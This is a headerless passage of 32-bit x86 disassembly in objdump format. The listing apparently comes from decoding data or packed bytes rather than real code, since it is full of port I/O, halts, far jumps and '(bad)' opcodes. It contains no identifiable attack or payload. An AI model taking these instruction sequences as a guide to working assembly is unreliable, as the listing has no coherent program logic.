  44a9ab:	mov    dl,BYTE PTR [esi+0x46e80801]
  44a9b1:	or     al,0xb4
  44a9b3:	sar    DWORD PTR fs:[ebx-0x6df8105d],cl
  44a9ba:	dec    ecx
  44a9bb:	ret    
  44a9bc:	sbb    BYTE PTR ds:0x3a023cc0,bl
  44a9c2:	inc    esi
  44a9c3:	xchg   esp,eax
  44a9c4:	and    al,0xb6
  44a9c6:	scas   eax,DWORD PTR es:[edi]
  44a9c7:	sahf   
  44a9c8:	dec    edi
  44a9c9:	jmp    0x44a9e0
  44a9cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a9cc:	pop    edx
  44a9cd:	dec    eax
  44a9ce:	or     dh,BYTE PTR [ecx+esi*1]
  44a9d1:	mov    ds:0xb81f6f4b,al
  44a9d6:	int3   
  44a9d7:	jg     0x44a981
  44a9d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a9da:	repnz addr16 out dx,al
  44a9dd:	out    0xbc,eax
  44a9df:	hlt    
  44a9e0:	lds    ebx,FWORD PTR [ebx-0x2e]
  44a9e3:	pusha  
  44a9e4:	in     eax,0xfd
  44a9e6:	xor    eax,0xffffffd9
  44a9e9:	test   eax,0x8943dde3
  44a9ee:	lods   al,BYTE PTR ds:[esi]
  44a9ef:	outs   dx,DWORD PTR ds:[esi]
  44a9f0:	mov    ch,0xee
  44a9f2:	or     eax,0xfbe13339
  44a9f7:	in     al,dx
  44a9f8:	in     eax,0x33
  44a9fa:	xchg   ebp,esp
  44a9fc:	or     dl,BYTE PTR [ebx-0x5f8b8e1f]
  44aa02:	mov    bh,0x6f
  44aa04:	int    0x8e
  44aa06:	lods   eax,DWORD PTR ds:[esi]
  44aa07:	jne    0x44a99d
  44aa09:	test   eax,0x2d7e23b8
  44aa0e:	aad    0x6f
  44aa10:	dec    ecx
  44aa11:	fsub   DWORD PTR [ecx]
  44aa13:	mov    al,ds:0xf451a455
  44aa18:	lahf   
  44aa19:	adc    bh,BYTE PTR cs:[eax]
  44aa1c:	push   ds
  44aa1d:	test   eax,0x19c16590
  44aa22:	mov    edi,0x1b9abbcc
  44aa27:	mov    bl,BYTE PTR [eax]
  44aa29:	adc    bl,BYTE PTR [bx]
  44aa2c:	xor    edi,esp
  44aa2e:	mov    al,BYTE PTR [ebx+eiz*1]
  44aa31:	sbb    DWORD PTR [eax+0x2c],esi
  44aa34:	inc    esp
  44aa35:	or     BYTE PTR [ebx],dl
  44aa37:	mov    DWORD PTR ds:0xe5c26bad,ebx
  44aa3d:	mov    edx,DWORD PTR [ebp-0x4e6a760]
  44aa43:	jge    0x44a9d2
  44aa45:	dec    ecx
  44aa46:	aad    0xcf
  44aa48:	jnp    0x44a9fd
  44aa4a:	mov    ebx,0xb455ab96
  44aa4f:	scas   eax,DWORD PTR es:[edi]
  44aa50:	test   DWORD PTR [edx-0x1e4a10d0],ecx
  44aa56:	loopne 0x44aa35
  44aa58:	dec    DWORD PTR [ecx-0x62fe5e51]
  44aa5e:	mov    ch,0xb5
  44aa60:	cdq    
  44aa61:	inc    esp
  44aa62:	sub    esi,DWORD PTR [ebp+edx*8-0x7d]
  44aa66:	cli    
  44aa67:	in     al,dx
  44aa68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44aa69:	pop    eax
  44aa6a:	in     al,0xcb
  44aa6c:	sbb    al,0x59
  44aa6e:	aad    0x79
  44aa70:	stc    
  44aa71:	jo     0x44aa16
  44aa73:	hlt    
  44aa74:	out    0x97,eax
  44aa76:	mov    esp,0x9d9f680a
  44aa7b:	push   esp
  44aa7c:	xor    eax,0xbefeb623
  44aa81:	cmp    al,0x4f
  44aa83:	inc    esp
  44aa84:	xchg   BYTE PTR [eax-0x347e2b30],ch
  44aa8a:	lahf   
  44aa8b:	bnd jnp 0x44aa2c
  44aa8e:	mov    edx,DWORD PTR [ebp+0x7b]
  44aa91:	cmp    dh,BYTE PTR [esi-0x50]
  44aa94:	icebp  
  44aa95:	sbb    BYTE PTR [edx-0x487e93f3],cl
  44aa9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44aa9c:	cmp    al,0x91
  44aa9e:	inc    ecx
  44aa9f:	xchg   edi,eax
  44aaa0:	push   ebp
  44aaa1:	mov    dl,BYTE PTR [edx-0x1a]
  44aaa4:	jge    0x44aaf6
  44aaa6:	and    eax,ebp
  44aaa8:	and    DWORD PTR [ecx-0x1804bf7e],ebx
  44aaae:	push   edi
  44aaaf:	scas   al,BYTE PTR es:[edi]
  44aab0:	out    0xa0,eax
  44aab2:	or     esp,DWORD PTR [ebp+0x7a]
  44aab5:	dec    eax
  44aab6:	cmp    bh,BYTE PTR [eax-0x70dcc40d]
  44aabc:	mov    BYTE PTR [ebp-0x3a],ah
  44aabf:	and    al,0xce
  44aac1:	mov    cs:0x82e81f21,eax
  44aac7:	je     0x44aaad
  44aac9:	mov    dh,0x2e
  44aacb:	xchg   edi,eax
  44aacc:	inc    edi
  44aacd:	hlt    
  44aace:	dec    esp
  44aacf:	push   ds
  44aad0:	gs not bh
  44aad3:	repz or eax,0x17b76e8e
  44aad9:	mov    ds:0x35b884b7,eax
  44aade:	push   eax
  44aadf:	rcr    BYTE PTR [ecx-0x873432b],1
  44aae5:	inc    esi
  44aae6:	mov    al,0xec
  44aae8:	dec    ebx
  44aae9:	enter  0x9693,0x5b
  44aaed:	lods   al,BYTE PTR ds:[esi]
  44aaee:	out    dx,eax
  44aaef:	inc    esp
  44aaf0:	mov    BYTE PTR [edi+esi*2],ah
  44aaf3:	leave  
  44aaf4:	xor    DWORD PTR [ecx+0xbf1298b],ebx
  44aafa:	in     al,0xeb
  44aafc:	xchg   edi,eax
  44aafd:	and    eax,0xac697c27
  44ab02:	mov    al,0x14
  44ab04:	sbb    BYTE PTR [esi],dl
  44ab06:	pusha  
  44ab07:	xor    al,BYTE PTR [edi+0x4d]
  44ab0a:	push   ecx
  44ab0b:	jbe    0x44ab85
  44ab0d:	pushf  
  44ab0e:	xchg   ecx,eax
  44ab0f:	in     al,dx
  44ab10:	sbb    edi,DWORD PTR [ecx+0x11a20875]
  44ab16:	xor    DWORD PTR [ebp+0x637c7b47],0x63de95e3
  44ab20:	outs   dx,DWORD PTR ds:[esi]
  44ab21:	mov    esi,DWORD PTR [ecx-0x4688a6f2]
  44ab27:	adc    bl,bl
  44ab29:	mov    al,ds:0x4f1924bd
  44ab2e:	mov    ch,0x8c
  44ab30:	frstor [edx-0x2e1a3d55]
  44ab36:	cli    
  44ab37:	jne    0x44aacf
  44ab39:	(bad)  
  44ab3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ab3b:	jno    0x44ab7e
  44ab3d:	dec    esi
  44ab3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ab3f:	sbb    ax,0x7185
  44ab43:	jle    0x44ab34
  44ab45:	mov    eax,ds:0x9f956fa9
  44ab4a:	out    dx,eax
  44ab4b:	lock addr16 loope 0x44ab0d
  44ab4f:	sub    al,0x1f
  44ab51:	test   eax,0xab52255c
  44ab56:	sbb    ebx,eax
  44ab58:	fwait
  44ab59:	popf   
  44ab5a:	mov    ebx,DWORD PTR [ebx-0xac26997]
  44ab60:	jle    0x44abcb
  44ab62:	ds popa 
  44ab64:	xchg   BYTE PTR [edi-0x4f],bh
  44ab67:	les    ecx,FWORD PTR [edx]
  44ab69:	pusha  
  44ab6a:	scas   eax,DWORD PTR es:[edi]
  44ab6b:	jle    0x44abc3
  44ab6d:	cmp    eax,0x40171765
  44ab72:	mov    edi,0xb349f7ff
  44ab77:	jg     0x44ab98
  44ab79:	xchg   BYTE PTR [eax],ah
  44ab7b:	inc    ebp
  44ab7c:	sbb    al,ch
  44ab7e:	mov    al,dh
  44ab80:	xchg   DWORD PTR cs:[esi+0xba02b89],ecx
  44ab87:	nop
  44ab88:	mov    eax,ds:0x1df18375
  44ab8d:	or     DWORD PTR [edi+ebp*2+0x73ef52a4],esi
  44ab94:	mov    eax,0x5090ab99
  44ab99:	push   es
  44ab9a:	xlat   BYTE PTR ds:[ebx]
  44ab9b:	mov    bh,0x7b
  44ab9d:	test   DWORD PTR [edx],ebp
  44ab9f:	clc    
  44aba0:	pop    edi
  44aba1:	sbb    al,0xb4
  44aba3:	les    ecx,FWORD PTR ds:0x25654e10
  44aba9:	sbb    al,0xd6
  44abab:	jmp    0xd0225300
  44abb0:	pop    ss
  44abb1:	mov    ecx,0xd3d2c129
  44abb6:	inc    edx
  44abb7:	or     esi,ebx
  44abb9:	sahf   
  44abba:	dec    ebx
  44abbb:	push   ecx
  44abbc:	stos   BYTE PTR es:[edi],al
  44abbd:	jae    0x44abd9
  44abbf:	(bad)  
  44abc0:	xor    eax,0x61829ea6
  44abc5:	adc    eax,0x5b4bf4c7
  44abca:	xchg   esi,eax
  44abcb:	clc    
  44abcc:	fld    TBYTE PTR [eax+0x199732fb]
  44abd2:	cmp    BYTE PTR [esi],dl
  44abd4:	jp     0x44ab5d
  44abd6:	or     dl,ah
  44abd8:	dec    ebp
  44abd9:	xchg   edi,eax
  44abda:	sub    esp,ebp
  44abdc:	sbb    eax,0x6e7d8a8f
  44abe1:	mov    bl,0x8b
  44abe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44abe4:	ja     0x44ac32
  44abe6:	mov    BYTE PTR [ecx+0x18],bl
  44abe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44abea:	push   edx
  44abeb:	outs   dx,DWORD PTR ds:[esi]
  44abec:	mov    ecx,ds
  44abee:	leave  
  44abef:	lea    ebx,[ebx+0x10e36ea4]
  44abf5:	and    ah,ah
  44abf7:	jae    0x44ab83
  44abf9:	out    0xf9,eax
  44abfb:	xor    eax,0xefd940cb
  44ac00:	clc    
  44ac01:	adc    DWORD PTR [ebx-0x33],edx
  44ac04:	call   0x23d97b1b
  44ac09:	jae    0x44ac2c
  44ac0b:	ficomp DWORD PTR cs:[edx+0x6c32527b]
  44ac12:	xchg   edi,eax
  44ac13:	adc    al,0x9a
  44ac15:	inc    edi
  44ac16:	mov    eax,DWORD PTR gs:[ebp-0x49]
  44ac1a:	mov    edx,0xa9f002a4
  44ac1f:	out    dx,eax
  44ac20:	(bad)  
  44ac21:	sbb    ebx,ebp
  44ac23:	fstp   QWORD PTR [eax]
  44ac25:	add    DWORD PTR [esi+esi*8+0x65],esp
  44ac29:	jge    0x44abc2
  44ac2b:	neg    BYTE PTR [eax]
  44ac2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ac2e:	imul   ebx,DWORD PTR [eax-0x38],0xffffffbd
  44ac32:	ds mov dl,0x56
  44ac35:	push   ebx
  44ac36:	repz rol BYTE PTR ds:0x6ee93770,cl
  44ac3d:	je     0x44ac98
  44ac3f:	aaa    
  44ac40:	sbb    cl,bh
  44ac42:	test   BYTE PTR [ebp+eiz*4-0x5],dl
  44ac46:	dec    eax
  44ac47:	lds    esp,FWORD PTR [ebx+0x470a6ba3]
  44ac4d:	arpl   WORD PTR [ebx-0x59],cx
  44ac50:	dec    edi
  44ac51:	adc    ch,BYTE PTR [edx]
  44ac53:	mov    DWORD PTR [ecx-0x64],edx
  44ac56:	mov    ah,0xb4
  44ac58:	pop    ecx
  44ac59:	ror    BYTE PTR [ebp+eax*2-0x19ba55fb],1
  44ac60:	les    ebp,FWORD PTR [esi-0x41]
  44ac63:	sub    eax,esi
  44ac65:	fidivr DWORD PTR ds:0x7d9d87f4
  44ac6b:	mov    BYTE PTR [edx],bl
  44ac6d:	test   eax,0xa8b90268
  44ac72:	sti    
  44ac73:	jecxz  0x44ac19
  44ac75:	sbb    DWORD PTR [edx],esp
  44ac77:	out    0x5a,eax
  44ac79:	ror    BYTE PTR [eax-0x1],cl
  44ac7c:	and    DWORD PTR [edx+esi*4-0x1c],edi
  44ac80:	jno    0x44ac08
  44ac82:	jne    0x44ac44
  44ac84:	hlt    
  44ac85:	pushf  
  44ac86:	or     ebp,DWORD PTR [edx*4-0x12ea82a]
  44ac8d:	retfw  
  44ac8f:	jecxz  0x44ac50
  44ac91:	xchg   ecx,eax
  44ac92:	mov    dl,0xb4
  44ac94:	lea    ecx,[edi+0x67758320]
  44ac9a:	pop    eax
  44ac9b:	in     al,dx
  44ac9c:	adc    edx,DWORD PTR [ecx-0x27dbdab9]
  44aca2:	xchg   ebx,eax
  44aca3:	hlt    
  44aca4:	ins    BYTE PTR es:[edi],dx
  44aca5:	lea    edi,[ebp+0x7fda0f04]
  44acab:	xrelease xchg BYTE PTR [eax+0x4e],bh
  44acaf:	fsub   QWORD PTR [esi]
  44acb1:	iret   
  44acb2:	inc    ecx
  44acb3:	cmp    ebp,DWORD PTR [edx+eiz*4]
  44acb6:	inc    ebx
  44acb7:	push   ecx
  44acb8:	and    al,0x5
  44acba:	jg     0x44ac74
  44acbc:	ins    DWORD PTR es:[edi],dx
  44acbd:	mov    al,ds:0x7fda50ab
  44acc2:	rcl    DWORD PTR ds:[edx+0x42],1
  44acc6:	fstp   DWORD PTR [edx+0x14baa970]
  44accc:	xchg   DWORD PTR [ebx],esi
  44acce:	add    DWORD PTR [eax-0x1b0ce50b],ecx
  44acd4:	adc    BYTE PTR [edi-0x48abd758],0x9d
  44acdb:	sub    DWORD PTR [eax],0xfffffff6
  44acde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44acdf:	jmp    0x65021dd7
  44ace4:	push   ebx
  44ace5:	jns    0x44ad38
  44ace7:	mov    WORD PTR [ebp+0xe],fs
  44acea:	xlat   BYTE PTR ds:[ebx]
  44aceb:	out    dx,eax
  44acec:	aas    
  44aced:	fnstenv [esp+edx*8+0x17]
  44acf1:	jmp    0x3c360814
  44acf6:	sub    eax,0xdba18aa1
  44acfb:	mov    edx,0x3c776675
  44ad00:	xor    BYTE PTR [esi],0xf
  44ad03:	lods   eax,DWORD PTR ds:[esi]
  44ad04:	and    ecx,ebx
  44ad06:	or     al,0x5c
  44ad08:	stos   BYTE PTR es:[edi],al
  44ad09:	iret   
  44ad0a:	mov    ah,0x90
  44ad0c:	iret   
  44ad0d:	xchg   ebp,eax
  44ad0e:	out    dx,eax
  44ad0f:	push   ecx
  44ad10:	(bad)  
  44ad12:	pop    es
  44ad13:	pop    edx
  44ad14:	in     eax,0x6
  44ad16:	dec    eax
  44ad17:	in     eax,0xd4
  44ad19:	shl    DWORD PTR [ebx],0x19
  44ad1c:	jne    0x44ad34
  44ad1e:	mov    cl,0x44
  44ad20:	daa    
  44ad21:	test   DWORD PTR [ebp-0x6],ebp
  44ad24:	xchg   DWORD PTR [eax+ebx*8+0x66cb7db6],ebp
  44ad2b:	hlt    
  44ad2c:	xchg   edi,eax
  44ad2d:	mov    BYTE PTR [ebx-0x26],0xae
  44ad31:	icebp  
  44ad32:	mov    ecx,0xc0fdfe84
  44ad37:	inc    ebp
  44ad38:	es pushf 
  44ad3a:	jl     0x44ad97
  44ad3c:	and    BYTE PTR [edi-0x30599e11],bl
  44ad42:	repz aad 0x73
  44ad45:	cmp    eax,0x65ee4b9
  44ad4a:	mov    ch,BYTE PTR [edi+0xea16494]
  44ad50:	pop    ds
  44ad51:	pop    ecx
  44ad52:	(bad)  [esi]
  44ad54:	mov    dl,0xd5
  44ad56:	mov    ecx,ebx
  44ad58:	sbb    edi,DWORD PTR [ecx-0x4f0673ac]
  44ad5e:	cmp    eax,0xc35d6751
  44ad63:	add    edx,DWORD PTR ds:0x51f0bc6e
  44ad69:	sbb    bl,BYTE PTR [edi]
  44ad6b:	mov    esi,0xc325c923
  44ad70:	iret   
  44ad71:	mov    BYTE PTR [edx-0x2cfe567d],dl
  44ad77:	leave  
  44ad78:	xchg   ebp,eax
  44ad79:	stos   BYTE PTR es:[edi],al
  44ad7a:	push   eax
  44ad7b:	out    dx,eax
  44ad7c:	sbb    cl,dh
  44ad7e:	pop    edi
  44ad7f:	sub    edx,DWORD PTR ds:0x8580028d
  44ad85:	in     al,dx
  44ad86:	dec    edx
  44ad87:	in     eax,0x47
  44ad89:	push   0x7975eb91
  44ad8e:	cmp    esi,esi
  44ad90:	add    BYTE PTR [edx-0x54bafd42],ch
  44ad96:	mov    al,0x68
  44ad98:	stos   BYTE PTR es:[edi],al
  44ad99:	loopne 0x44ad52
  44ad9b:	add    al,0x2f
  44ad9d:	test   eax,0xa45a60c
  44ada2:	fucomi st,st(2)
  44ada4:	iret   
  44ada5:	xchg   edx,eax
  44ada6:	clc    
  44ada7:	adc    al,0x55
  44ada9:	jo     0x44ad2c
  44adab:	dec    edi
  44adac:	lods   eax,DWORD PTR ds:[esi]
  44adad:	pop    ebp
  44adae:	xchg   esp,eax
  44adaf:	inc    ebp
  44adb0:	mov    bh,0x8a
  44adb2:	mov    ds:0x48ac1bf8,al
  44adb7:	call   0x39ed51
  44adbc:	mov    cl,0xf3
  44adbe:	jle    0x44ae0b
  44adc0:	mov    ah,0x9b
  44adc2:	dec    edi
  44adc3:	cli    
  44adc4:	idiv   BYTE PTR [ebx+ecx*1-0x4e250b9f]
  44adcb:	fs mov bl,0x0
  44adce:	(bad)  
  44adcf:	mov    eax,ds:0xedc37615
  44add4:	or     eax,0xe3e4f1a2
  44add9:	mov    esp,0xa94dde0c
  44adde:	mov    ds:0xd2a723ea,eax
  44ade3:	cs jne 0x44ad71
  44ade6:	cmp    dh,ah
  44ade8:	dec    ebp
  44ade9:	aaa    
  44adea:	pop    ss
  44adeb:	stos   BYTE PTR es:[edi],al
  44adec:	push   esp
  44aded:	cmp    edi,esp
  44adef:	push   es
  44adf0:	nop
  44adf1:	call   0x4007c3d6
  44adf6:	test   eax,0xfa4324f5
  44adfb:	popa   
  44adfc:	test   DWORD PTR [ebx+0x2113ef8e],edi
  44ae02:	out    dx,al
  44ae03:	pop    eax
  44ae04:	mov    edi,DWORD PTR [ecx]
  44ae06:	sar    ebp,1
  44ae08:	adc    eax,0x31ac1826
  44ae0d:	out    dx,al
  44ae0e:	mov    ebx,0x33a845ec
  44ae13:	lock and BYTE PTR ss:[eax-0x6a],0xa1
  44ae19:	and    al,0x4b
  44ae1b:	or     DWORD PTR [edi],edx
  44ae1d:	aam    0xdb
  44ae1f:	and    al,0x90
  44ae21:	sahf   
  44ae22:	pop    ss
  44ae23:	retf   
  44ae24:	jmp    0xe39db9cb
  44ae29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ae2a:	push   ebx
  44ae2b:	mov    ?,WORD PTR ds:0x9312ac39
  44ae31:	mov    eax,0x215c94b8
  44ae36:	adc    ah,BYTE PTR [ebx+0x6]
  44ae39:	xchg   al,ah
  44ae3b:	sbb    DWORD PTR [ecx+0x38],ebx
  44ae3e:	mov    ebx,0x2993bea8
  44ae43:	in     eax,dx
  44ae44:	and    DWORD PTR [edi],esi
  44ae46:	or     BYTE PTR [edx+0x34b2b10b],al
  44ae4c:	jmp    0x1f80:0xd5b2812b
  44ae53:	dec    ecx
  44ae54:	(bad)  
  44ae55:	push   ecx
  44ae56:	daa    
  44ae57:	and    DWORD PTR [edi],ebx
  44ae59:	lods   eax,DWORD PTR ds:[esi]
  44ae5a:	mov    DWORD PTR [ebx],edx
  44ae5c:	add    ebx,DWORD PTR [edi-0x3499ae74]
  44ae62:	mov    edx,0xd5f95a34
  44ae67:	stos   BYTE PTR es:[edi],al
  44ae68:	xlat   BYTE PTR ds:[ebx]
  44ae69:	jp     0xdef69116
  44ae6f:	lods   al,BYTE PTR ds:[esi]
  44ae70:	(bad)  
  44ae71:	cdq    
  44ae72:	xor    dh,dh
  44ae74:	lahf   
  44ae75:	xor    ecx,esp
  44ae77:	and    DWORD PTR ds:0xb0e80e79,edi
  44ae7d:	test   al,0xb
  44ae7f:	sub    ecx,DWORD PTR [edx+0x49]
  44ae82:	mov    ds:0xd066c351,al
  44ae87:	sbb    eax,0x97ba055
  44ae8c:	mov    edi,ds
  44ae8e:	ret    0x6df
  44ae91:	sub    DWORD PTR [esi+0x7ba6dc9b],edi
  44ae97:	pop    ds
  44ae98:	jle    0x44aee4
  44ae9a:	retf   0x66dc
  44ae9d:	push   es
  44ae9e:	in     eax,0x51
  44aea0:	ror    BYTE PTR [edi-0x34b7e784],0xf9
  44aea7:	mov    al,ds:0x983a061
  44aeac:	mov    BYTE PTR [ebx+ecx*1+0x3c0f99ac],ch
  44aeb3:	out    0x5c,eax
  44aeb5:	test   al,0x8d
  44aeb7:	add    esp,DWORD PTR [ebx]
  44aeb9:	sbb    ebx,ebp
  44aebb:	pop    edx
  44aebc:	xor    BYTE PTR [eax-0x570520c9],0xbb
  44aec3:	inc    eax
  44aec4:	pop    edi
  44aec5:	(bad)  
  44aec6:	rol    BYTE PTR [ebx],1
  44aec8:	inc    edi
  44aec9:	adc    DWORD PTR [ecx-0x3fa9895b],eax
  44aecf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44aed0:	loope  0x44ae6e
  44aed2:	jo     0x44aea4
  44aed4:	add    BYTE PTR [eax+0x10559bba],0x49
  44aedb:	in     eax,0x90
  44aedd:	scas   eax,DWORD PTR es:[edi]
  44aede:	push   esp
  44aedf:	bound  edi,QWORD PTR ds:0x47ca9560
  44aee5:	gs mov dl,0x47
  44aee8:	mov    ecx,0x6181ba5
  44aeed:	scas   eax,DWORD PTR es:[edi]
  44aeee:	pop    es
  44aeef:	push   es
  44aef0:	mov    cl,0x67
  44aef2:	jno    0x44aedc
  44aef4:	clc    
  44aef5:	lds    esi,FWORD PTR [eax+0x466790a4]
  44aefb:	cmc    
  44aefc:	fstp   QWORD PTR [ebp-0x26c55ba5]
  44af02:	test   BYTE PTR [edi+eax*8+0x52699bf8],0x3b
  44af0a:	test   eax,0xb360b676
  44af0f:	cld    
  44af10:	loope  0x44aeb1
  44af12:	dec    ebx
  44af13:	addr16 retf 
  44af15:	jne    0x44aef5
  44af17:	xor    cl,BYTE PTR [eax-0x4c]
  44af1a:	adc    esp,0xffffffa4
  44af1d:	bswap  edx
  44af1f:	inc    esp
  44af20:	jle    0x44af85
  44af22:	push   ss
  44af23:	xchg   DWORD PTR [ebp-0x7a8d1cd3],edx
  44af29:	jbe    0x44af88
  44af2b:	repnz inc eax
  44af2d:	or     bl,cl
  44af2f:	std    
  44af30:	inc    esi
  44af31:	dec    ecx
  44af32:	inc    ebp
  44af33:	mov    eax,ds:0x37aff955
  44af38:	inc    ebx
  44af39:	add    eax,0x31f5ec0c
  44af3e:	aad    0xee
  44af40:	pop    es
  44af41:	gs in  al,0xe9
  44af44:	pop    ds
  44af45:	sub    DWORD PTR [esi-0xb],ebp
  44af48:	xor    ch,BYTE PTR [esi-0x39700d56]
  44af4e:	test   eax,0x252fe5f3
  44af53:	repz rcr edi,cl
  44af56:	pop    ecx
  44af57:	push   0x30d16923
  44af5c:	xchg   ecx,ecx
  44af5e:	fisubr WORD PTR [edi-0x43]
  44af61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44af62:	stos   DWORD PTR es:[edi],eax
  44af63:	jae    0x44af21
  44af65:	jae    0x44afa5
  44af67:	push   ecx
  44af68:	test   ah,dl
  44af6a:	outs   dx,DWORD PTR ds:[esi]
  44af6b:	mov    edx,0x65252974
  44af70:	push   edi
  44af71:	scas   eax,DWORD PTR es:[edi]
  44af72:	push   eax
  44af73:	ffree  st(3)
  44af75:	fwait
  44af76:	rol    eax,cl
  44af78:	fcomp  QWORD PTR [ecx-0x55]
  44af7b:	bound  edi,QWORD PTR ds:0x38534b99
  44af81:	sbb    esp,edi
  44af83:	xor    DWORD PTR [edi],0x538c256c
  44af89:	inc    ebx
  44af8a:	mov    edx,0x52add554
  44af8f:	fsubrp st(6),st
  44af91:	adc    eax,0x7fbb1418
  44af96:	mov    edi,0x3d198ccd
  44af9b:	loop   0x44af64
  44af9d:	shl    cl,1
  44af9f:	maxps  xmm6,xmm5
  44afa2:	mov    ecx,0x3e09651b
  44afa7:	in     eax,dx
  44afa8:	dec    ebp
  44afa9:	(bad)  
  44afaa:	mov    ch,bh
  44afac:	or     edi,DWORD PTR [ebx+0x7d4e327c]
  44afb2:	mov    ds:0x85a66ae8,al
  44afb7:	addr16 pop esi
  44afb9:	sub    al,0x3c
  44afbb:	push   0x17
  44afbd:	mov    ebp,0x5f668d02
  44afc2:	mov    ecx,0x61da0934
  44afc7:	pop    ebp
  44afc8:	call   FWORD PTR [edx+0x2c61bd4b]
  44afce:	fadd   QWORD PTR [ecx]
  44afd0:	ss test al,0x88
  44afd3:	enter  0x1f88,0x61
  44afd7:	push   cs
  44afd8:	fdiv   QWORD PTR [eax+0x917f204]
  44afde:	jns    0x44afda
  44afe0:	pop    eax
  44afe2:	sbb    BYTE PTR [edx-0x63],0x30
  44afe6:	dec    esp
  44afe7:	in     eax,dx
  44afe8:	ja     0x44b031
  44afea:	mov    eax,ds:0xb2912a62
  44afef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44aff0:	pop    ds
  44aff1:	dec    ecx
  44aff2:	and    eax,0xbd762fc9
  44aff7:	and    eax,0x98b9953
  44affc:	call   0xc70b:0x7a99822
  44b003:	adc    al,0xb3
  44b005:	or     BYTE PTR [ecx+0x7cc649a4],bh
  44b00b:	cmp    al,0x2b
  44b00d:	in     eax,0x70
  44b00f:	stos   DWORD PTR es:[edi],eax
  44b010:	retf   0xc298
  44b013:	and    al,0xfb
  44b015:	lahf   
  44b016:	push   ebx
  44b017:	mov    dh,0x74
  44b019:	push   esp
  44b01a:	mov    ah,0x13
  44b01c:	outs   dx,BYTE PTR ds:[esi]
  44b01d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b01e:	mov    edx,edx
  44b020:	in     eax,dx
  44b021:	pop    ecx
  44b022:	mov    ds:0xd26b7dfe,al
  44b027:	or     dh,cl
  44b029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b02a:	mov    ecx,DWORD PTR [eax-0x2a]
  44b02d:	inc    ecx
  44b02e:	push   edi
  44b02f:	jg     0x44aff3
  44b031:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b032:	imul   edx,DWORD PTR [edx-0x4e3a9a8f],0x4f
  44b039:	jmp    FWORD PTR [edi-0x7d]
  44b03c:	icebp  
  44b03d:	repnz mov ebp,0x5c22094
  44b043:	ds gs dec esp
  44b046:	fwait
  44b047:	out    0x3c,al
  44b049:	inc    esp
  44b04a:	call   0x7ff5:0xf6094f8d
  44b051:	xchg   esi,eax
  44b052:	push   ds
  44b053:	add    dh,cl
  44b055:	push   es
  44b056:	imul   ebp,ecx,0x5
  44b059:	dec    edx
  44b05a:	repnz repz std 
  44b05d:	adc    al,0x17
  44b05f:	push   ecx
  44b060:	xlat   BYTE PTR ds:[ebx]
  44b061:	sbb    DWORD PTR [eax+eiz*2+0x48],edi
  44b065:	pop    edx
  44b066:	je     0x44b02a
  44b068:	aad    0x72
  44b06a:	inc    ebx
  44b06b:	in     eax,0x64
  44b06d:	adc    dl,dl
  44b06f:	push   ss
  44b070:	sbb    bh,BYTE PTR [ecx-0x751ddcd9]
  44b076:	test   eax,0xcb9e0d5d
  44b07b:	stos   DWORD PTR es:[edi],eax
  44b07c:	outs   dx,DWORD PTR ds:[esi]
  44b07d:	push   ebp
  44b07e:	inc    edx
  44b07f:	jns    0x44b0fd
  44b081:	out    0x71,al
  44b083:	push   cs
  44b084:	sbb    cl,cl
  44b086:	cmp    DWORD PTR [esi+0x58],ebx
  44b089:	xor    BYTE PTR [edi-0x37e8ad9],ah
  44b08f:	scas   al,BYTE PTR es:[edi]
  44b090:	clc    
  44b091:	push   edi
  44b092:	cwde   
  44b093:	aam    0x74
  44b095:	in     al,0xba
  44b097:	es sub ch,cl
  44b09a:	mov    ah,0x86
  44b09c:	stos   DWORD PTR es:[edi],eax
  44b09d:	cli    
  44b09e:	adc    DWORD PTR [esi+0x1a4f58a5],edi
  44b0a4:	aad    0xb3
  44b0a6:	xor    ah,0x2c
  44b0a9:	jmp    0xc8ad:0x9ae9e26d
  44b0b0:	and    al,0x39
  44b0b2:	jle    0x44b040
  44b0b4:	push   eax
  44b0b5:	shl    DWORD PTR [ebx+ecx*1-0xf1ccd2b],0x66
  44b0bd:	sahf   
  44b0be:	cmp    al,BYTE PTR [edi]
  44b0c0:	inc    eax
  44b0c1:	jp     0x44b106
  44b0c3:	push   eax
  44b0c4:	and    cl,BYTE PTR [ecx]
  44b0c6:	add    BYTE PTR [ecx],0xf8
  44b0c9:	inc    ecx
  44b0ca:	cld    
  44b0cb:	out    dx,eax
  44b0cc:	xchg   esp,eax
  44b0cd:	div    DWORD PTR [edx+0x76c3854c]
  44b0d3:	out    0x71,al
  44b0d5:	push   ecx
  44b0d6:	mov    dh,0x42
  44b0d8:	cld    
  44b0d9:	stos   DWORD PTR es:[edi],eax
  44b0da:	fwait
  44b0db:	popa   
  44b0dc:	pop    ds
  44b0dd:	cmp    DWORD PTR [edi-0x5e3065a],edi
  44b0e3:	jae    0x44b0aa
  44b0e5:	test   al,0x71
  44b0e7:	in     eax,0x7
  44b0e9:	test   eax,0xa917430c
  44b0ee:	gs jns 0x44b098
  44b0f1:	cmp    BYTE PTR [esi-0x13],dl
  44b0f4:	inc    esp
  44b0f5:	cdq    
  44b0f6:	sub    esi,DWORD PTR [edx]
  44b0f8:	in     al,0x57
  44b0fa:	out    0xf6,al
  44b0fc:	xor    dl,BYTE PTR [esi]
  44b0fe:	icebp  
  44b0ff:	jae    0x44b106
  44b101:	cmp    eax,0x55469687
  44b106:	mov    edi,0x6c15ab00
  44b10b:	adc    esp,ebx
  44b10d:	out    0x51,eax
  44b10f:	push   edi
  44b110:	jge    0x44b097
  44b112:	or     al,0xf3
